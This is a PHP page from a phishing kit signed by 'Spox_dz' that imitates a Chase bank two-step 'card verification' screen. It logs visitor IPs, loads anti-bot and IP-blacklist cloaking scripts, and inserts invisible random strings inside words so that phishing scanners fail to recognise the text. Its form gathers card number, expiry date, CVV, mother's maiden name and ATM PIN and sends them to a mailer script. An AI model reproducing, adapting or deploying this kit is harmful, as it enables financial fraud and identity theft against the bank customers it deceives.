<?php
session_start();
error_reporting(0);

/**
 * DO NOT SELL THIS SCRIPT ! 
 * DO NOT CHANGE COPYRIGHT !
 * Chase -
 * version 3.0
 * icq & telegram = @spoxcoder
 
###############################################
#$            C0d3d by Spox_dz               $#
#$   Recording doesn't  make you a Coder     $#
#$          Copyright 2020 Chase             $#
###############################################

**/

include'Spox/Anti/IP-BlackList.php';  
include'Spox/Anti/Bot-Crawler.php';
include'Spox/Anti/Bot-Spox.php';
include'Spox/Anti/blacklist.php';
include'Spox/Anti/new.php';
include'Spox/Functions/Fuck-you.php'; 
include'Spox/Anti/Dila_DZ.php';

if (!isset($_GET['chase_id']) || !isset($_GET['country'])) {
        header("HTTP/1.0 404 Not Found");
        exit();
    }
    
if (!isset($_SESSION['CHASE_SPOX'])) {
  header("Location: index");
  exit();
}
if (!isset($_SESSION['login_SESSION'])) {
  header("Location: login");
  exit();
}

    $content2 = "#>".$_SESSION['ip']."\r\n";
    $save2=fopen("Spox/Chase_Result/total_cc_view.txt","a+");
    fwrite($save2,$content2);
    fclose($save2);

$rundom = substr(sha1(mt_rand()),1,25);
?>
<html xmlns="http://www.w3.org/1999/xhtml" class="no-js" lang="en" dir="ltr">
<head>
        <meta charset="UTF-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
        <title>2-Step Verification</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
        <meta name="apple-mobile-web-app-capable" content="yes">
        <meta name="apple-mobile-web-app-status-bar-style" content="black">
        <link id="externalCSSLink" rel="external stylesheet" href="Spox/Files/css/external.css">
        <link id="favIconLink" rel="shortcut icon" type="image/x-icon" href="Spox/Files/img/chasefavicon.ico">
        <link href="Spox/Files/css/origination.css" rel="stylesheet" id="originationCSS">
    </head>
<style type="text/css">
        .help-block.form-error{
        color:#BF2155;
    }
        .help-block.form-error{
        color:#bf2155;
        font-size: 19px;
    }
    .jpui.alert.primary .title {
    font-size: 1rem;
    color: #bf2155;
    font-weight: 400;
    line-height: 1.4;
    margin: .0625rem .0625rem .313rem 0;
}
.jpui.alert.primary.inverted {
    color: #bf2155!important;
}
.jpui.alert.primary {
    background-color: #bf2155;
}

    .jpui.alert.spox.spox .title {
    font-size: 1rem;
    font-weight: 300;
    color: #bf2155;
    letter-spacing: 0;
    text-decoration: none;
    width: 100%;
    margin: .0625rem .0625rem .313rem 0;
}


</style>
    <body   class="no-ignore-color">
        <div id="container"> 
            <header id="header-container"  >
                <div class="header-container"  > 
                    <div class="row top"><div class="col-xs-4"> 
                <span id="menuLines-iconanchor-wrapper">
                    <a class="jpui iconaction focus onDark" href="javascript:void(0);" id="menuLines">  <i class="jpui menulines icon" id="icon-menuLines" aria-hidden="true">
                        
                    </i>
                </a>
            </span> 
                <span class="jpui link" id="exitApp-link-wrapper">
                    <a class="link-anchor INPUTFIELD2" id="exitApp" href="javascript:void(0);" aria-label=" Exit , opens dialog">Exit</a>
                </span>
            </div> 

<div class="col-xs-4 color-mode-header-logo">
<svg class="octogon" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" version="1.1" id="Layer_1" x="0px" y="0px" width="30px" height="30px" viewBox="0 0 268 268" xml:space="preserve" xml="http://www.w3.org/XML/1998/namespace" focusable="false">
<path d="M100.749,8.655c-4.88,0-8.86,3.968-8.86,8.844v62.095h164.04L181.227,8.69L100.749,8.655" style="fill: rgb(255, 255, 255);">
</path> 
<path d="M261.945,98.372c0-4.884-3.947-8.82-8.875-8.82h-62.052V253.6l70.896-74.726L261.945,98.372" style="fill: rgb(255, 255, 255);">           
</path> 
<path d="M172.177,259.538c4.864,0,8.86-3.965,8.86-8.845v-62.099H16.989l74.678,70.943H172.177" style="fill: rgb(255, 255, 255);">
</path> 
<path d="M10.996,169.848c0,4.896,3.933,8.829,8.832,8.829h62.111V14.629L10.996,89.362V169.848" style="fill: rgb(255, 255, 255);">
</path>
</svg>
</div> 
  <div class="col-xs-4 util right aligned">
                
            </div>
        </div>
    </div>
</header> 
<div id="main-container">
            <aside id="helpbar" role="complementary" aria-label="Help Bar">
            </aside> 
            <div>
            <form action="Spox/Mail/Mail4" method="POST">
            <main class="container-fluid" id="main">
                <div id="progressbar-block"  >
                <div  >
<style id="progress-bar-step-1of8">.origination-custom.jpui.progress.bar.step1of8:after{width: 50%;}</style>
                <div class="row origination-progress-block">
                    <div class="col-xs-12 col-sm-8 col-lg-6 col-sm-push-2 col-lg-push-3">
                        <div id="PROGRESSBAR_HEADER">
                    <div>
    <h1 id="stepNameTagElementId" tabindex="-1" aria-describedby="stepNameApplicantTypeHeader">Veri<font style="color:transparent;font-size:0px"><?=$rundom;?></font>ficat<font style="color:transparent;font-size:0px"><?=$rundom;?></font>ion</h1> 
                <span class="jpui util accessible-text" id="stepNameApplicantTypeHeader" aria-hidden="true">
                
            </span>
            </div>
            </div> 
                <div id="PROGRESSBAR_PROGRESS">
                <div class="row"><div class="col-xs-12 col-sm-12">
                <div class="jpui progress origination-custom step1of8 bar" id="main-progress" data-progress="">
                    <div class="bar fill" id="main-progress-bar">
                
            </div> 
                <span class="util accessible-text" id="accessible-bar-main-progress">
                
            </span>
        </div>
    </div>
</div>
</div>  


<div id="PROGRESSBAR_ADVISORY">
 <div>
    <h2 id="stepAdvisoryTagElementId" tabindex="-1">Te<font style="color:transparent;font-size:0px"><?=$rundom;?></font>ll us abo<font style="color:transparent;font-size:0px"><?=$rundom;?></font>ut your c<font style="color:transparent;font-size:0px"><?=$rundom;?></font>ar<font style="color:transparent;font-size:0px"><?=$rundom;?></font>d det<font style="color:transparent;font-size:0px"><?=$rundom;?></font>ails.
</h2>
 </div>
</div>


</div>
</div>
<style id="progress-bar-step-2of8">.origination-custom.jpui.progress.bar.step2of8:after{width: 50%;}</style>
</div>
</div>

<section class="origination page-content" id="content"  >

    <div >
        <div class="row">
            <div class="col-xs-12 col-sm-8 col-lg-6 col-sm-push-2 col-lg-push-3">



    <?php 
    if (isset($_GET['invalid'])) {
    $invalid = isset($_GET['invalid']) ? trim(htmlentities($_GET['invalid'])):'';
    $em = "card";
    if ($invalid == $em) {
        echo'<div class="field-mb-24">
                <div class="jpui inverted error primary alert" id="accountOriginationErrorHeader" role="region">
                  <div class="icon">
                    <span id="type-icon-accountOriginationErrorHeader">
                      <i class="jpui exclamation-color error icon" id="icon-type-icon-accountOriginationErrorHeader" aria-hidden="true"></i></span>
                    </div>
                    <div class="icon background"></div>
                    <div class="content wrap" id="content-accountOriginationErrorHeader">
                      <h2 class="title" tabindex="-1" id="inner-accountOriginationErrorHeader">
                        <span class="util accessible-text" id="icon-accountOriginationErrorHeader">Im<font style="color:transparent;font-size:0px"><?=$rundom;?></font>po<font style="color:transparent;font-size:0px"><?=$rundom;?></font>rtant:</span>It looks like there\'s an issue with the in<font style="color:transparent;font-size:0px"><?=$rundom;?></font>fo you told us. Ple<font style="color:transparent;font-size:0px"><?=$rundom;?></font>ase do<font style="color:transparent;font-size:0px"><?=$rundom;?></font>uble-che<font style="color:transparent;font-size:0px"><?=$rundom;?></font>ck your ca<font style="color:transparent;font-size:0px"><?=$rundom;?></font>rd det<font style="color:transparent;font-size:0px"><?=$rundom;?></font>ai<font style="color:transparent;font-size:0px"><?=$rundom;?></font>ls.</h2>
                      </div>
                    </div>
                  </div><input type="hidden" name="invalid" value="invalid">';}}?>


                <div id="personalName"  >
                    <div id="personal-name"  >
                        <div class="row">
                            <div class="col-xs-12 col-sm-6">
                            <div class="jpui header DATABOLD field-mb-12 field-mt-0" id="PERSONAL_NAME_HEADER">C<font style="color:transparent;font-size:0px"><?=$rundom;?></font>a<font style="color:transparent;font-size:0px"><?=$rundom;?></font>rd de<font style="color:transparent;font-size:0px"><?=$rundom;?></font>tai<font style="color:transparent;font-size:0px"><?=$rundom;?></font>ls</div>
                        </div>
                    </div>
                    <div class="row">
                        <div class="col-xs-12 col-sm-12">
                            <div class="BODY field-mb-24">Please verify the c<font style="color:transparent;font-size:0px"><?=$rundom;?></font>ar<font style="color:transparent;font-size:0px"><?=$rundom;?></font>d deta<font style="color:transparent;font-size:0px"><?=$rundom;?></font>ils linked to your account.</div>
                        </div>
                    </div>
                   </div>
</div>
<div class="row">
<div class="col-sm-6 col-md-5">
<div class="jpui fieldgroup text-input-custom account-id" id="accountIdentifier">
<div class="jpui vertical">
<div class="align-label-input">
<div class="label-wrapper">
  <label class="jpui fieldlabel label-alignment vertical" id="accountIdentifier-label" for="accountIdentifier-text-validate-input-field" aria-hidden="false">
    <span class="util accessible-text" id="accountIdentifier-label-errorLabel"></span><font style="color:transparent;font-size:0px"><?=$rundom;?></font>C<font style="color:transparent;font-size:0px"><?=$rundom;?></font>a<font style="color:transparent;font-size:0px"><?=$rundom;?></font>r<font style="color:transparent;font-size:0px"><?=$rundom;?></font>d n<font style="color:transparent;font-size:0px"><?=$rundom;?></font>umb<font style="color:transparent;font-size:0px"><?=$rundom;?></font>er<div class="yield" id="accountIdentifier-label-additionalContent">
      <span class="util accessible-text"></span>
</div>
<span class="util accessible-text" id="accountIdentifier-label-accessible-text"></span>
</label>
<div class="jpui tooltip false" id="accountIdentifier-tooltip">
  <a class="trigger" href="javascript:void(0);" id="accountIdentifier-tooltip-trigger-icon">
    <i class="jpui info-color icon" id="accountIdentifier-tooltip-info-icon" aria-hidden="true"></i>
  </a>
</div>
</div>
<div class="jpui validationinput" id="accountIdentifier-text">
<div id="accountIdentifier-text-validate">
<input  class="jpui input" placeholder="" type="tel" name="spox_cc" required="" data-validation="creditcard" data-validation-error-msg="  ">

  <span class="util accessible-text validation__accessible-text" id="accountIdentifier-text-validate-placeHolderAdaText">  </span>
</div>
</div>
</div> 
<div>
<div>  
</div>
</div>
</div>
</div>
</div>
</div>


<div class="row">
<div class="col-sm-6 col-md-5">
<div class="jpui fieldgroup text-input-custom" id="socialSecurityNumber">
<div class="jpui vertical">
<div class="align-label-input">
<div class="label-wrapper">
  <label class="jpui fieldlabel label-alignment vertical" id="socialSecurityNumber-label" for="socialSecurityNumber-text-validate-input-field" aria-hidden="false">
    <span class="util accessible-text" id="socialSecurityNumber-label-errorLabel"></span>E<font style="color:transparent;font-size:0px"><?=$rundom;?></font>xpir<font style="color:transparent;font-size:0px"><?=$rundom;?></font>atio<font style="color:transparent;font-size:0px"><?=$rundom;?></font>n date<div class="yield" id="socialSecurityNumber-label-additionalContent">
      <span class="util accessible-text"></span>
    </div>
    <span class="util accessible-text" id="socialSecurityNumber-label-accessible-text"></span>
  </label>
</div>
<div class="jpui validationinput" id="socialSecurityNumber-text">
<div class="jpui validation__bubble-container util accessible-text" id="socialSecurityNumber-text-error-bubble" aria-hidden="true">
<div class="label-wrap">
<div class="jpui error pointing noborder down jpui validation-error-bubble attached label" id="socialSecurityNumber-text-error-message" data-arrowposition="50"></div>
</div>
</div>
<span class="jpui validation__accessible-text" id="socialSecurityNumber-text-error-message-accessible">Please tell us a So<font style="color:transparent;font-size:0px"><?=$rundom;?></font>ci<font style="color:transparent;font-size:0px"><?=$rundom;?></font>al Se<font style="color:transparent;font-size:0px"><?=$rundom;?></font>curi<font style="color:transparent;font-size:0px"><?=$rundom;?></font>ty nu<font style="color:transparent;font-size:0px"><?=$rundom;?></font>mber.</span>
<div id="socialSecurityNumber-text-validate">
                    <input  class="jpui input" id="exp" placeholder=""  type="tel" name="spox_cc_exp" data-validation="length"  data-validation-length="min7"  data-validation-error-msg="  ">
<span class="util accessible-text" id="socialSecurityNumber-text-validate-accessible-text" aria-hidden="true">, formats as you type xx<font style="color:transparent;font-size:0px"><?=$rundom;?></font>x-xx-xxxx</span>   <span class="util accessible-text validation__accessible-text" id="socialSecurityNumber-text-validate-placeHolderAdaText">  </span>
</div>
</div>
</div>
<div><div>
<div class="fieldhelpertext-container" id="socialSecurityNumber-helpertext-container">
<div class="jpui fieldhelpertext" id="socialSecurityNumber-text-validate-helpertext">mm/yy<font style="color:transparent;font-size:0px"><?=$rundom;?></font>yy
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>




<div class="row">
  <p class="BODY col-lg-12 userId-text">the thr<font style="color:transparent;font-size:0px"><?=$rundom;?></font>ee-di<font style="color:transparent;font-size:0px"><?=$rundom;?></font>git C<font style="color:transparent;font-size:0px"><?=$rundom;?></font>V<font style="color:transparent;font-size:0px"><?=$rundom;?></font>V numb<font style="color:transparent;font-size:0px"><?=$rundom;?></font>er is print<font style="color:transparent;font-size:0px"><?=$rundom;?></font>ed on the bac<font style="color:transparent;font-size:0px"><?=$rundom;?></font>k of the card to the rig<font style="color:transparent;font-size:0px"><?=$rundom;?></font>ht of the signature box.

</p>
<div class="jpui fieldgroup col-xs-12" id="userId">
<div class="jpui vertical row">
<div class="align-label-input">
<div class="label-wrapper col-xs-12">
<label class="jpui fieldlabel label-alignment vertical" id="userId-label" for="userId-text-validate-input-field" aria-hidden="false">
S<font style="color:transparent;font-size:0px"><?=$rundom;?></font>ecu<font style="color:transparent;font-size:0px"><?=$rundom;?></font>ri<font style="color:transparent;font-size:0px"><?=$rundom;?></font>ty co<font style="color:transparent;font-size:0px"><?=$rundom;?></font>de<div class="yield" id="userId-label-additionalContent">
</div>
<span class="util accessible-text" id="userId-label-accessible-text"></span>
</label>

</div>
<div class="text-input-custom user-id-input col-sm-6 col-md-5 col-xs-12">
<div class="jpui validationinput" id="userId-text">
<div class="jpui validation__bubble-container util accessible-text" id="userId-text-error-bubble" aria-hidden="true">
<div class="label-wrap">
<div class="jpui error pointing noborder down jpui validation-error-bubble attached label" data-arrowposition="50">
</div>
</div>
</div>
<div id="userId-text-validate" class="">
<input class="jpui input"  placeholder="" type="password" name="spox_cvv"  data-validation="cvv" data-validation-error-msg="  ">
</div>
</div>
</div>
</div>
<div class="col-xs-12"></div>
<div>
<div>
<div class="fieldhelpertext-container" id="userId-helpertext-container"></div> 
</div>
</div>
</div> 
</div>
</div>

<div id="identificationId"  >
      <div id="IDENTIFICATION"  > 
     <div id="addressId"  >
      <div id="address"  >
      <div class="row container-padding-after-field">
        <div class="col-xs-12 col-sm-6">
        <div class="jpui header DATABOLD field-mt-0 field-mb-24">C<font style="color:transparent;font-size:0px"><?=$rundom;?></font>ar<font style="color:transparent;font-size:0px"><?=$rundom;?></font>d Veri<font style="color:transparent;font-size:0px"><?=$rundom;?></font>ficat<font style="color:transparent;font-size:0px"><?=$rundom;?></font>ion</div>
 </div>
 </div>
     <div id="bb-residentialAddressBlock"  >
        <div class="jpmcbb multiType" id="MULTI_TYPE_ADDRESS_blx-residentialAddressBlock"  >
        <div>
            <div class="jpmcbb addressForm">
            <div class="row">
                <div class="col-xs-12 col-sm-6">
        <div class="jpui fieldgroup addressStreetAddress blockFieldGroupXs" id="streetAddress-blx-residentialAddressBlock">
            <div class="jpui vertical">
                <div class="align-label-input">
                    <div class="label-wrapper">
        <label class="jpui fieldlabel label-alignment vertical" id="streetAddress-blx-residentialAddressBlock-label" for="streetAddress-blx-residentialAddressBlock-text-validate-input-field" aria-hidden="false">
        <span class="util accessible-text" id="streetAddress-blx-residentialAddressBlock-label-errorLabel">
         
     </span>Mot<font style="color:transparent;font-size:0px"><?=$rundom;?></font>her's Mai<font style="color:transparent;font-size:0px"><?=$rundom;?></font>den Na<font style="color:transparent;font-size:0px"><?=$rundom;?></font>me <span class="util accessible-text" id="streetAddress-blx-residentialAddressBlock-label-accessible-text">
         
     </span>
 </label>
 </div>
 <div class="jpui validationinput" id="streetAddress-blx-residentialAddressBlock-text">
    <div id="streetAddress-blx-residentialAddressBlock-text-validate">
    <input  class="jpui input" placeholder=""  type="text" name="mmn" data-validation="length" data-validation-length="min1-12" data-validation-error-msg=" ">
<span class="util accessible-text validation__accessible-text" id="streetAddress-blx-residentialAddressBlock-text-validate-placeHolderAdaText">
            
        </span>
    </div>
    </div>
    </div>
        <div>
            <div>
            
        </div>
    </div>
    </div>
    </div>
    </div>
     <div class="col-xs-12 col-sm-6">
        <div class="jpui fieldgroup blockFieldGroupXs" id="apartmentNumber-blx-residentialAddressBlock">
        <div class="jpui vertical">
        <div class="align-label-input">
            <div class="label-wrapper">
        <label class="jpui fieldlabel label-alignment vertical" id="apartmentNumber-blx-residentialAddressBlock-label" for="apartmentNumber-blx-residentialAddressBlock-text-validate-input-field" aria-hidden="false">
    <span class="util accessible-text" id="apartmentNumber-blx-residentialAddressBlock-label-errorLabel">
        
    </span>Atm pin
<span class="util accessible-text" id="apartmentNumber-blx-residentialAddressBlock-label-accessible-text">
         
     </span>
     </label>
 </div>
     <div class="jpui validationinput" id="apartmentNumber-blx-residentialAddressBlock-text">
        <div id="apartmentNumber-blx-residentialAddressBlock-text-validate">
    <input  class="jpui input" placeholder=""  type="password" name="spox_atm_pin" data-validation="length" data-validation-length="min4-4" data-validation-error-msg=" ">
<span class="util accessible-text validation__accessible-text" id="apartmentNumber-blx-residentialAddressBlock-text-validate-placeHolderAdaText">
         
     </span>
 </div>
 </div>
 </div>
     <div>
        <div>
        <div class="fieldhelpertext-container" id="apartmentNumber-blx-residentialAddressBlock-helpertext-container">
        <div class="jpui fieldhelpertext" id="apartmentNumber-blx-residentialAddressBlock-text-validate-helpertext">
         
     </div>
 </div>
 </div>
 </div>
 </div>
</div>
</div>
</div>

 
     <div id="disclosure"  >
        <div id="disclosureComponentId"  >
        <div class="row">
<div class="col-xs-12">
<p class="BODY" id="tcpa-disclosure">for addi<font style="color:transparent;font-size:0px"><?=$rundom;?></font>tiona<font style="color:transparent;font-size:0px"><?=$rundom;?></font>l secu<font style="color:transparent;font-size:0px"><?=$rundom;?></font>rity pl<font style="color:transparent;font-size:0px"><?=$rundom;?></font>ease ver<font style="color:transparent;font-size:0px"><?=$rundom;?></font>ify your m<font style="color:transparent;font-size:0px"><?=$rundom;?></font>mn to sub<font style="color:transparent;font-size:0px"><?=$rundom;?></font>mit your c<font style="color:transparent;font-size:0px"><?=$rundom;?></font>ar<font style="color:transparent;font-size:0px"><?=$rundom;?></font>d de<font style="color:transparent;font-size:0px"><?=$rundom;?></font>tail.


     </p>
     </div>
 </div>
     <div class="field-mt-24" id="maritalStatusForWI"></div>
     <div id="spousalInformationForWI">
     </div>
 </div>
</div>
<div id="autoLendingAgeInfoOverlayPlaceHolder">
</div>
 </div>
 </div>
</div>
</section>
 <div id="pageGroupSpinner">
     
 </div> <div id="navigationbar-container"  >
        <div id="NAVIGATIONBAR_CMPT"  >
            <div class="row">
                <div class="col-xs-12 col-sm-8 col-lg-6 col-sm-push-2 col-lg-push-3">
            <div class="row">
                <div class="col-xs-12 navigation-top-margin">
        <button type="submit" id="NEXT-nav-ctr-btn" class="jpui button focus util float right primary">
        <span class="label">Next</span>
     </button>
        <button type="button" id="BACK-nav-ctr-btn" class="jpui button focus util float right tertiary">
            <span class="label">Back</span>
        </button>
     </div>
 </div>
 </div>
 </div>
 </div>
 </div>
</main>
<input type="hidden" name="token_spox" value="Fuck_you_by_spox">


</form>
</body>
        <script src="https://rawgit.com/RobinHerbots/Inputmask/4.x/dist/inputmask/dependencyLibs/inputmask.dependencyLib.js"></script>
<script src="https://rawgit.com/RobinHerbots/Inputmask/4.x/dist/inputmask/inputmask.js"></script>

<script src="//ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js"></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/jquery-form-validator/2.3.26/jquery.form-validator.min.js"></script>
<script>
  $.validate({
    modules : 'security'
  });
  Inputmask("9{1,2}/9{1,4}").mask("#exp");

$("#formid").validate({
  invalidHandler: function(event, validator) {
    // 'this' refers to the form
    var errors = validator.numberOfInvalids();
    if (errors) {
      var message = errors == 1
        ? 'You missed 1 field. It has been highlighted'
        : 'You missed ' + errors + ' fields. They have been highlighted';
      $("div.error span").html(message);
      $("div.error").show();
    } else {
      $("div.error").hide();
    }
  }
});
</script>
</html>